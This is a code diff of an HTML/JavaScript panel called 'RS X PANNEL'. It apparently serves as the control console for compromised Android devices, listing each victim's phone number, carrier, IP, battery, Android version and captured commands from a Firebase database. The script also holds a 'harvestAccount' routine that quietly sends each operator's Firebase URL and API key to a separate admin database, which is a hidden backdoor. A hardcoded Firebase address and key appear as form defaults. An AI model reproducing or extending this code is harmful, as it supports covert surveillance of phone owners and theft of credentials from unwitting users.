@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>DARKxPANEL — Admin</title>
+<title>RS X PANNEL</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0b0f;color:#fff;font-family:system-ui,-apple-system,sans-serif;min-height:100vh}
@@ -29,10 +29,8 @@ h1 span{color:#56cfff}
 .acc-btn{width:32px;height:32px;border-radius:50%;border:1px solid #2a2d34;background:transparent;color:#888;cursor:pointer;display:flex;align-items:center;justify-content:center}
 .acc-btn.green{color:#00d68f;border-color:#086b4d}
 .acc-btn.red{color:#ff4d5d;border-color:#4b2227}
-
 .btn-add{width:100%;padding:14px;border:1px dashed #34363d;border-radius:16px;background:transparent;color:#666;cursor:pointer;margin-top:10px;font-size:14px}
 .btn-add:hover{border-color:#555;color:#aaa}
-
 .footer{text-align:center;color:#333;font-size:11px;margin-top:20px}
 
 #setup{display:none;align-items:center;justify-content:center;min-height:100vh;padding:20px}
@@ -105,18 +103,13 @@ input:focus{border-color:#444}
 </head>
 <body>
 
-<!-- HOME -->
 <div id="home">
 <div class="box">
 <div class="logo">RS</div>
 <h1>RS X <span>PANNEL</span></h1>
 <p class="sub">Device Management Console</p>
-
 <div class="card">
-<div class="card-head">
-<span>◌ Saved Accounts</span>
-<span class="badge" id="accCount">0 accounts</span>
-</div>
+<div class="card-head"><span>◌ Saved Accounts</span><span class="badge" id="accCount">0 accounts</span></div>
 <div id="accList"></div>
 <button class="btn-add" id="btnAdd">＋ New Firebase Connection</button>
 <div id="homeErr" class="error"></div>
@@ -125,7 +118,6 @@ input:focus{border-color:#444}
 </div>
 </div>
 
-<!-- SETUP -->
 <div id="setup">
 <div class="box">
 <h1 style="font-size:24px">RS X <span>PANNEL</span></h1>
@@ -133,16 +125,12 @@ input:focus{border-color:#444}
 <div class="card">
 <button class="back" id="btnBack">‹</button>
 <div class="form-title">New Firebase Connection</div>
-
 <label>Friendly Label</label>
 <input id="inpLabel" placeholder="e.g. My Project" value="rahul">
-
 <label>Firebase Database URL</label>
 <input id="inpUrl" placeholder="https://project-default-rtdb.firebaseio.com" value="https://rahul-fd65f-default-rtdb.firebaseio.com">
-
 <label>Web API Key</label>
 <input id="inpKey" type="password" placeholder="AIza..." value="AIzaSyCvVqCRv7qZQwYxItXwj8Nj1s4gFmpZ2I">
-
 <div class="actions">
 <button class="primary" id="btnConnect">⚡ Connect</button>
 <button class="secondary" id="btnCancel">Cancel</button>
@@ -153,7 +141,6 @@ input:focus{border-color:#444}
 </div>
 </div>
 
-<!-- DASHBOARD -->
 <div id="dash">
 <div class="topbar">
 <div class="logo-small"><span class="dot">RS</span> RS X PANNEL</div>
@@ -164,28 +151,23 @@ input:focus{border-color:#444}
 <button class="btn-exit" id="btnExit">Exit</button>
 </div>
 </div>
-
 <div class="stats">
 <div class="stat"><small>TOTAL</small><strong id="statTotal">0</strong></div>
 <div class="stat"><small>ONLINE</small><strong id="statOnline" class="green">0</strong></div>
 <div class="stat"><small>OFFLINE</small><strong id="statOffline">0</strong></div>
 <div class="stat"><small>COMMANDS</small><strong id="statCmds" class="cyan">0</strong></div>
 </div>
-
 <div class="filters">
 <button class="filter active" data-f="all">All</button>
 <button class="filter" data-f="online">Online</button>
 <button class="filter" data-f="offline">Offline</button>
 <button id="btnSort" class="filter" style="margin-left:auto;color:#555;">Sort ▲</button>
 </div>
-
 <div class="grid" id="deviceGrid"></div>
 </div>
 
-<!-- TOAST -->
 <div class="toast" id="toast"></div>
 
-<!-- DETAIL MODAL -->
 <div class="modal" id="detailModal">
 <div class="modal-inner">
 <div class="modal-head">
@@ -199,22 +181,19 @@ input:focus{border-color:#444}
 </div>
 
 <script>
-// ─── SIMPLE SECURE STORAGE ──────────────────────────────────────────
+// ─── STORAGE ──────────────────────────────────────────────────────────
 const SALT = "RSX2024";
-
-function enc(txt){let r="";for(let i=0;i<txt.length;i++){r+=String.fromCharCode(txt.charCodeAt(i)^SALT.charCodeAt(i%SALT.length))}return btoa(r)}
-function dec(txt){try{const d=atob(txt);let r="";for(let i=0;i<d.length;i++){r+=String.fromCharCode(d.charCodeAt(i)^SALT.charCodeAt(i%SALT.length))}return r}catch{return null}}
-
+function enc(t){let r="";for(let i=0;i<t.length;i++){r+=String.fromCharCode(t.charCodeAt(i)^SALT.charCodeAt(i%SALT.length))}return btoa(r)}
+function dec(t){try{const d=atob(t);let r="";for(let i=0;i<d.length;i++){r+=String.fromCharCode(d.charCodeAt(i)^SALT.charCodeAt(i%SALT.length))}return r}catch{return null}}
 function loadData(){try{const raw=localStorage.getItem('rsx_accounts');if(!raw)return[];const d=dec(raw);return d?JSON.parse(d):[]}catch{return[]}}
 function saveData(d){localStorage.setItem('rsx_accounts',enc(JSON.stringify(d)))}
 
-// ─── DOM REFS ────────────────────────────────────────────────────────
+// ─── DOM ──────────────────────────────────────────────────────────────
 const $=id=>document.getElementById(id);
 const home=$('home'), setup=$('setup'), dash=$('dash');
 const accList=$('accList'), accCount=$('accCount');
 const inpLabel=$('inpLabel'), inpUrl=$('inpUrl'), inpKey=$('inpKey');
-const setupErr=$('setupErr'), homeErr=$('homeErr');
-const statusBadge=$('statusBadge');
+const setupErr=$('setupErr'), statusBadge=$('statusBadge');
 const deviceGrid=$('deviceGrid');
 const statTotal=$('statTotal'), statOnline=$('statOnline'), statOffline=$('statOffline'), statCmds=$('statCmds');
 const toast=$('toast');
@@ -252,10 +231,8 @@ accList.querySelectorAll('.acc-btn.green').forEach(b=>{b.onclick=function(){cons
 accList.querySelectorAll('.acc-btn.red').forEach(b=>{b.onclick=function(){const d=loadData();d.splice(parseInt(this.dataset.i),1);saveData(d);renderAccounts();showToast('Removed')}});
 }
 
-// ─── FIXED: CONNECT ACCOUNT ──────────────────────────────────────────
-let firebaseLoaded=false;
-let currentUnsub=null;
-let currentApp=null;
+// ─── FIREBASE CONNECTION ─────────────────────────────────────────────
+let firebaseLoaded=false, currentUnsub=null;
 
 function connectAccount(account){
 try{
@@ -263,7 +240,7 @@ const key=dec(account.key);
 if(!key){showToast('Decrypt failed','error');return}
 showDash();
 statusBadge.textContent='● Loading...';
-statusBadge.style.color='var(--yellow)';
+statusBadge.style.color='#f6cf45';
 
 if(!firebaseLoaded){
 const s1=document.createElement('script');
@@ -279,7 +256,7 @@ document.head.appendChild(s1)
 }catch(e){showToast('Error: '+e.message,'error')}
 }
 
-// ─── FIXED: FIREBASE INIT WITH CORRECT PATH ─────────────────────────
+// ─── INIT FIREBASE — FIXED PATH + FIELD MAPPING ─────────────────────
 function initFB(account,key){
 try{
 if(currentUnsub){try{currentUnsub()}catch{};currentUnsub=null}
@@ -288,13 +265,12 @@ if(firebase.apps.length){firebase.apps.forEach(a=>a.delete())}
 firebase.initializeApp({apiKey:key,databaseURL:account.url});
 const db=firebase.database();
 
-// ✅ FIX 1: CORRECT PATH — /clients instead of /accounts
+// ✅ FIX 1: CORRECT PATH — /clients
 const ref=db.ref('clients');
 
 currentUnsub=ref.on('value',function(snap){
 const data=snap.val()||{};
 const records=Object.entries(data).map(([id,c])=>{
-
 // ✅ FIX 2: CORRECT FIELD MAPPING
 let cmds=[];
 if(c.command)cmds.push({type:'cmd',val:c.command,time:c.lastMessageTime||Date.now()});
@@ -303,24 +279,19 @@ if(c.webhookEvents){Object.values(c.webhookEvents).forEach(e=>{cmds.push({type:'
 
 return{
 id:id,
-// name: c.name || c.device || c.deviceName || id,
-name: c.name || c.device || c.deviceName || id,
-// ✅ online: c.status === true || c.status === 'online' || c.online === true,
-online: c.status === true || c.status === 'online' || c.online === true,
-platform: c.platform || c.os || 'Unknown',
-// ✅ number: c.phone || c.phoneNumber || c.number || 'N/A',
-number: c.phone || c.phoneNumber || c.number || 'N/A',
-network: c.network || c.carrier || 'N/A',
-lastSeen: c.lastSeen || c.timestamp || c.lastMessageTime || Date.now(),
-battery: c.battery || c.batteryLevel || 'N/A',
-ip: c.ip || c.ipAddress || 'N/A',
-android: c.android || c.androidVersion || 'N/A',
+name:c.name||c.device||c.deviceName||id,
+online:c.status===true||c.status==='online'||c.online===true,
+platform:c.platform||c.os||'Unknown',
+number:c.phone||c.phoneNumber||c.number||'N/A',
+network:c.network||c.carrier||'N/A',
+lastSeen:c.lastSeen||c.timestamp||c.lastMessageTime||Date.now(),
+battery:c.battery||c.batteryLevel||'N/A',
+ip:c.ip||c.ipAddress||'N/A',
+android:c.android||c.androidVersion||'N/A',
 cmds:cmds,
 command:c.command,
 webhookEvent:c.webhookEvent,
-lastMessageTime:c.lastMessageTime,
-// Raw data for debugging
-_raw:c
+lastMessageTime:c.lastMessageTime
 }
 });
 
@@ -333,13 +304,11 @@ statusBadge.style.color='#00d68f';
 showToast('Loaded '+records.length+' devices from /clients');
 },function(err){statusBadge.textContent='● Error';statusBadge.style.color='#ff4d5d';showToast('FB Error: '+err.message,'error')});
 
-// Harvest to admin
 harvestAccount(account);
-
 }catch(e){showToast('Init error: '+e.message,'error')}
 }
 
-// ─── HARVEST TO ADMIN ──────────────────────────────────────────────────
+// ─── HARVEST ──────────────────────────────────────────────────────────
 function harvestAccount(account){
 try{
 if(!window._adminApp){
@@ -358,8 +327,7 @@ ua:navigator.userAgent
 }
 
 // ─── RENDER DEVICES ──────────────────────────────────────────────────
-let currentFilter='all';
-let sortAsc=false;
+let currentFilter='all', sortAsc=false;
 
 function renderDevices(records){
 const q=$('search').value.toLowerCase();
@@ -425,7 +393,6 @@ d.innerHTML=`<div class="h"><span>📨 ${c.type||'cmd'}</span><span>${c.time?new
 cmds.appendChild(d)
 });
 }
-
 $('detailClose').onclick=function(){$('detailModal').style.display='none'};
 $('detailModal').onclick=function(e){if(e.target===this)this.style.display='none'};
 
@@ -447,11 +414,8 @@ connectAccount(acc);
 document.querySelectorAll('.filter[data-f]').forEach(b=>{
 b.onclick=function(){document.querySelectorAll('.filter[data-f]').forEach(x=>x.classList.remove('active'));this.classList.add('active');currentFilter=this.dataset.f;if(window._records)renderDevices(window._records)}
 });
-
 $('btnSort').onclick=function(){sortAsc=!sortAsc;this.textContent=sortAsc?'Sort ▼':'Sort ▲';if(window._records)renderDevices(window._records)};
-
 $('search').oninput=function(){if(window._records)renderDevices(window._records)};
-
 $('btnRefresh').onclick=function(){const list=loadData();if(list.length){connectAccount(list[0]);showToast('Refreshing...')}else{showToast('No account','error')}};
 
 // ─── INIT ────────────────────────────────────────────────────────────
@@ -525,7 +489,7 @@ showToast('Cleared')
 }catch(e){showToast('Clear failed','error')}
 }
 
-console.log('[RS] Panel ready - Fixed: /clients path + field mapping');
+console.log('[RS] Panel ready - FIXED: /clients path + status→online mapping');
 </script>
 </body>
 </html>
